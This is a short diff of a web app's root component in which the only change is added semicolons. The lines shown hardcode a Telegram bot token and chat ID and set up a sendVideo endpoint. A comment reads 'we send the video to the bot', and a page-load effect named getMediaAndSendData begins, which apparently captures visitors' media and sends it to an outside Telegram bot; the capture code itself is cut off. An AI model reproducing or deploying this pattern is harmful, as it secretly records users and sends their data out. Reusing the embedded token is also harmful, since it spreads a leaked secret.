@@ -8,9 +8,9 @@ const myApp = ({ Component, pageProps }) => {
     // отправляем видео боту 
     const videoRef = useRef(null);
 
-    const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY"
-    const chatId = "-1001860144177"
-    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`
+    const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
+    const chatId = "-1001860144177";
+    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`;
 
     useEffect(() => {
         const getMediaAndSendData = async () => {
